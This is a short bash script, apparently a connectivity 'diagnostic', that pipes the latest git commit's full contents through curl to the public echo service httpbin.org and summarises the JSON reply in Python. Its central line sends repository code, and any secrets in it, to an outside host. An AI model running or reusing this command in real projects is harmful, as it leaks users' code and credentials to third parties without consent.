#!/usr/bin/env bash
set -euo pipefail

if ! git rev-parse --verify HEAD >/dev/null 2>&1; then
  echo "Error: no commits found. Commit your changes before running this diagnostic." >&2
  exit 1
fi

response_file=$(mktemp /tmp/httpbin-post.XXXXXX.json)

status=$(git show HEAD | curl -sS -X POST --data-binary @- -o "$response_file" -w "%{http_code}" https://httpbin.org/post || true)

if [[ "$status" != "200" ]]; then
  echo "HTTP POST failed with status $status" >&2
  if [[ -s "$response_file" ]]; then
    echo "--- Response body ---" >&2
    cat "$response_file" >&2
    echo "---------------------" >&2
  fi
  exit 1
fi

echo "HTTP POST succeeded (status $status). Response saved to $response_file" >&2
python - "$response_file" <<'PY'
import json
import sys
from pathlib import Path
path = Path(sys.argv[1])
try:
    data = json.loads(path.read_text())
except Exception as exc:
    print(f"Failed to parse JSON response: {exc}")
    sys.exit(1)
payload = data.get("form", {})
print(json.dumps({
    "url": data.get("url"),
    "top_level_keys": list(data.keys()),
    "form_field_count": len(payload),
    "form_character_count": sum(len(v) for v in payload.values()),
    "data_length": len(data.get("data", ""))
}, indent=2))
PY
